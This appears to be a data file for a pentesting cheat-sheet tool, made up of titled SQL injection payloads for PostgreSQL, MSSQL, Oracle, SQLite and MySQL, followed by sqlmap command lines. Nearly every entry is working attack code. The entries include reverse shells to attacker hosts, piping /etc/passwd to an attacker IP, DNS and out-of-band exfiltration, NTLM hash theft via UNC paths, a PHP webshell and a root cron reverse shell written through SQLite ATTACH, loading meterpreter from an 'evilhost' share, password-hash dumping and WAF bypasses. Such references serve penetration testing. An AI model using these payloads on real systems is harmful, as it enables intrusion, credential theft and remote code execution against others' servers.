    {t:'PostgreSQL - file read', p:'-- pg_read_file / pg_ls_dir\nselect pg_ls_dir(\'./\');\nselect pg_read_file(\'PG_VERSION\', 0, 200);\n\n-- COPY\nCREATE TABLE temp(t TEXT);\nCOPY temp FROM \'/etc/passwd\';\nSELECT * FROM temp limit 1 offset 0;\n\n-- lo_import\nSELECT lo_import(\'/etc/passwd\');\nSELECT lo_get(16420);'},
    {t:'PostgreSQL - file write (COPY)', p:'CREATE TABLE nc (t TEXT);\nINSERT INTO nc(t) VALUES(\'nc -lvvp 2346 -e /bin/bash\');\nSELECT * FROM nc;\nCOPY nc(t) TO \'/tmp/nc.sh\';\n\n-- in a single line\nCOPY (SELECT \'nc -lvvp 2346 -e /bin/bash\') TO \'/tmp/pentestlab\';'},
    {t:'PostgreSQL - RCE via COPY ... TO/FROM PROGRAM', p:'-- Postgres 9.3+ for superuser / pg_execute_server_program\nCOPY (SELECT \'\') TO PROGRAM \'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]\';\nCOPY (SELECT \'\') to PROGRAM \'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]\'\n\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f\';'},
    {t:'PostgreSQL - RCE via libc.so.6', p:'CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS \'/lib/x86_64-linux-gnu/libc.so.6\', \'system\' LANGUAGE \'c\' STRICT;\nSELECT system(\'cat /etc/passwd | nc <attacker IP> <attacker port>\');'},
    {t:'PostgreSQL - OOB via COPY/nslookup', p:'declare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := \'copy (SELECT \'\'\'\') to program \'\'nslookup \'||p||\'.BURP-COLLABORATOR-SUBDOMAIN\'\'\';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();'},
    {t:'PostgreSQL - checking for superuser', p:'SHOW is_superuser; \nSELECT current_setting(\'is_superuser\');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;'},
    {t:'MSSQL - list of DBs / tables / columns', p:'-- databases\nSELECT name FROM master..sysdatabases;\nSELECT name FROM master.sys.databases;\n\n-- tables (xtype=\'U\' is a user table, \'V\' is a view)\nSELECT name FROM master..sysobjects WHERE xtype = \'U\';\nSELECT name FROM <DBNAME>..sysobjects WHERE xtype=\'U\'\n\n-- columns\nSELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \'mytable\');\nSELECT COL_NAME(OBJECT_ID(\'<DBNAME>.<TABLE_NAME>\'), <INDEX>)'},
    {t:'MSSQL - file read (OPENROWSET BULK)', p:'-- requires ADMINISTER BULK OPERATIONS\nOPENROWSET(BULK \'C:\\path\\to\\file\', SINGLE_CLOB)\n\n-- example\n-1 union select null,(select x from OpenRowset(BULK \'C:\\Windows\\win.ini\',SINGLE_CLOB) R(x)),null,null'},
    {t:'MSSQL - RCE via xp_cmdshell', p:'EXEC xp_cmdshell "net user";\nEXEC master.dbo.xp_cmdshell \'cmd.exe dir c:\';\nEXEC master.dbo.xp_cmdshell \'ping 127.0.0.1\';'},
    {t:'MSSQL - enable xp_cmdshell', p:'-- enable advanced options\nEXEC sp_configure \'show advanced options\',1;\nRECONFIGURE;\n\n-- enable xp_cmdshell\nEXEC sp_configure \'xp_cmdshell\',1;\nRECONFIGURE;'},
    {t:'MSSQL - RCE via Python (external script)', p:'EXECUTE sp_execute_external_script @language = N\'Python\', @script = N\'print(__import__("getpass").getuser())\'\nEXECUTE sp_execute_external_script @language = N\'Python\', @script = N\'print(__import__("os").system("whoami"))\'\nEXECUTE sp_execute_external_script @language = N\'Python\', @script = N\'print(open("C:\\\\inetpub\\\\wwwroot\\\\web.config", "r").read())\''},
    {t:'MSSQL - stealing the NTLM hash (UNC / xp_dirtree)', p:'1\'; use master; exec xp_dirtree \'\\\\10.10.10.10\\SHARE\';-- \n\nxp_dirtree \'\\\\10.10.10.10\\file\'\nxp_fileexist \'\\\\10.10.10.10\\file\'\nBACKUP LOG [TESTING] TO DISK = \'\\\\10.10.10.10\\file\'\nBACKUP DATABASE [TESTING] TO DISK = \'\\\\10.10.10.10\\file\''},
    {t:'MSSQL - DNS exfiltration (OOB)', p:'-- VIEW SERVER STATE\n1 and exists(select * from fn_xe_file_target_read_file(\'C:\\*.xel\',\'\\\\\'%2b(select pass from users where id=1)%2b\'.[ATTACKER.DOMAIN.TLD]\\1.xem\',null,null))\n\n-- CONTROL SERVER\n1 and exists(select * from fn_trace_gettable(\'\\\\\'%2b(select pass from users where id=1)%2b\'.[ATTACKER.DOMAIN.TLD]\\1.trc\',default))'},
    {t:'MSSQL - Trusted Links (linked servers)', p:'-- find the links\nselect * from master..sysservers\n\n-- run a query through the link\nselect * from openquery("dcorp-sql1", \'select * from master..sysservers\')\nselect version from openquery("link1",\'select version from openquery("link2","select @@version as version")\')\n\n-- enable xp_cmdshell and run a command through the link\nEXECUTE(\'sp_configure \'\'xp_cmdshell\'\',1;reconfigure;\') AT LinkedServer\nselect 1 from openquery("linkedserver",\'select 1;exec master..xp_cmdshell "dir c:"\')'},
    {t:'MSSQL - privileges and DBA', p:'-- effective permissions\nSELECT * FROM fn_my_permissions(NULL, \'SERVER\'); \nSELECT * FROM fn_my_permissions (NULL, \'DATABASE\');\n\n-- role membership\nSELECT is_srvrolemember(\'sysadmin\');\n\n-- make a user a sysadmin\nEXEC master.dbo.sp_addsrvrolemember \'User\', \'sysadmin\';'},
    {t:'MSSQL - password hashes', p:'-- MSSQL 2000 (Hashcat mode 131)\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n\n-- MSSQL 2005 (Hashcat mode 132)\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + \'-\' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins'},
    {t:'Oracle - list of DBs / tables / columns', p:'-- databases (owners)\nSELECT DISTINCT owner FROM all_tables;\n\n-- tables\nSELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE \'%PASS%\';\n\n-- columns\nSELECT column_name FROM all_tab_columns WHERE table_name = \'blah\';\nSELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=\'<TABLE_NAME>\' AND OWNER=\'<DBNAME>\''},
    {t:'Oracle - OOB via XXE (EXTRACTVALUE)', p:'SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://\'||(SELECT YOUR-QUERY-HERE)||\'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>\'),\'/l\') FROM dual'},
    {t:'Oracle - RCE via Java (DBMS_JAVA)', p:'-- 10g R2, 11g R1/R2\nSELECT DBMS_JAVA_TEST.FUNCALL(\'oracle/aurora/util/Wrapper\',\'main\',\'c:\\\\windows\\\\system32\\\\cmd.exe\',\'/c\', \'dir >c:\\test.txt\') FROM DUAL\nSELECT DBMS_JAVA_TEST.FUNCALL(\'oracle/aurora/util/Wrapper\',\'main\',\'/bin/bash\',\'-c\',\'/bin/ls>/tmp/OUT2.LST\') from dual\n\n-- 11g R1/R2\nSELECT DBMS_JAVA.RUNJAVA(\'oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST\') FROM DUAL'},
    {t:'Oracle - RCE via DBMS_SCHEDULER', p:'DBMS_SCHEDULER.CREATE_JOB (job_name => \'exec\', job_type => \'EXECUTABLE\', job_action => \'<COMMAND>\', enabled => TRUE)'},
    {t:'Oracle - file read/write (UTL_FILE)', p:'-- NOTE: only in a stacked query\n\n-- read\nutl_file.get_line(utl_file.fopen(\'/path/to/\',\'file\',\'R\'), <buffer>)\n\n-- write\nutl_file.put_line(utl_file.fopen(\'/path/to/\',\'file\',\'W\'), <buffer>)'},
    {t:'SQLite - RCE via ATTACH DATABASE (webshell)', p:'ATTACH DATABASE \'/var/www/shell.php\' AS shell;\nCREATE TABLE shell.pwn (dataz text);\nINSERT INTO shell.pwn (dataz) VALUES (\'<?php system($_GET["cmd"]); ?>\');--'},
    {t:'SQLite - ATTACH DATABASE, an important detail', p:'SQLite prepends magic bytes to the start of the file (5351 4c69 7465 2066 6f72 6d61 7420 3300 = "SQLite format 3"). This breaks most server-side scripts, BUT PHP is tolerant: as long as there is a <?php tag somewhere in the file, the interpreter ignores the garbage before it and executes the code.\n\nIf you cannot upload PHP but the service runs as root, use the same trick to write a cron job with a reverse shell:\n  ATTACH DATABASE \'/etc/cron.d/pwn.task\' AS cron;\n  CREATE TABLE cron.tab (dataz text);\n  INSERT INTO cron.tab (dataz) VALUES (char(10) || \'* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1\' || char(10));--'},
    {t:'SQLite - load_extension / file write', p:'-- load_extension (disabled by default)\nSELECT load_extension(\'\\\\evilhost\\evilshare\\meterpreter.dll\',\'DllMain\');--\n\n-- file write\nSELECT writefile(\'/path/to/file\', column_name) FROM table_name'},
    {t:'MySQL - alternatives to information_schema / version', p:'-- instead of information_schema.tables\nSELECT * FROM mysql.innodb_table_stats;\nSHOW TABLES IN dvwa;\n\n-- instead of version()\nSELECT @@innodb_version;\nSELECT @@GLOBAL.VERSION;\n\n-- instead of group_concat() (MySQL >= 5.7.22, > 16M characters)\nSELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;'},
    {t:'MySQL - Scientific Notation (AWS WAF bypass)', p:'-- e-notation obfuscates the query\n-- \' or \'\'=\' is equivalent to \' or 1.e(\'\')=\'\n1\' or 1.e(1) or \'1\'=\'1\n\nSELECT table_name FROM information_schema 1.e.tables\n\n1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or\'1\'=\'2'},
    {t:'MySQL - Wide Byte Injection (GBK)', p:'-- With SET NAMES gbk the %df byte "eats" the backslash added by addslashes:\n-- ?id=1%df\'  →  SELECT * FROM users WHERE id=\'1連\'\' ...  (the quote breaks out)\n\n%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf\' OR 1=1 -- --\n?id=1%df\' and 1=1 --+'},
    {t:'Polyglot SQLi (time-based, multi-context)', p:'SLEEP(1) /*\' or SLEEP(1) or \'" or SLEEP(1) or "*/\nSELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample'},
    {t:'PDO - injection in a column name', p:'PDO with parameter binding is still vulnerable if the input ends up in the SQL text: $pdo->prepare("SELECT $col FROM ...").\n\nRequirements:\n• MySQL is vulnerable by default; Postgres only with PDO::ATTR_EMULATE_PREPARES => true; SQLite is not vulnerable.\n• In PHP 8.3 and below it is enough to smuggle in a ":" or "?" (no null byte needed).\n\nDetection (?#\\0): GET /index.php?col=%3f%23%00&name=anything\n  → You have an error in your SQL syntax ... near \'`\'anything\'#\'\n\nExploitation - inject into the second parameter:\n  GET /index.php?col=%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`\'x`+from+information_schema.tables)y%3b%2523'},
    {t:'SQLmap - basic run', p:'sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs'},
    {t:'SQLmap - request from a file and injection point', p:'# from a saved HTTP request\nsqlmap -r request.txt\n\n# custom injection point via * \nsqlmap -u "http://example.com" --data "username=admin&password=pass" --headers="x-forwarded-for:127.0.0.1*"'},
    {t:'SQLmap - second-order', p:'sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3'},
    {t:'SQLmap - getting a shell', p:'# SQL shell\nsqlmap -u "http://example.com/?id=1" -p id --sql-shell\n\n# OS shell\nsqlmap -u "http://example.com/?id=1" -p id --os-shell\n\n# Meterpreter\nsqlmap -u "http://example.com/?id=1" -p id --os-pwn\n\n# write an SSH key\nsqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/'},
    {t:'SQLmap - crawl and auto-exploitation', p:'# NOTE: only in a controlled environment - it submits forms (may hit delete/destroy)\nsqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3'},
    {t:'SQLmap - tamper scripts and proxy', p:'# tamper for WAF bypass\nsqlmap -u "http://target.com/vuln.php?id=1" --tamper=<tamper-script-name>\n\n# suffix/prefix\nsqlmap -u "http://example.com/?id=1" -p id --suffix="-- "\n\n# through a proxy (Burp)\nsqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"'},
    {t:'SQLmap - reduce the number of requests', p:'# filter by technique\nsqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"\n\n# select the technique (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)\nsqlmap -u "https://www.target.com/page.php?id=1" --technique=B\n\n# your own SQL query after confirming the injection\nsqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"'}
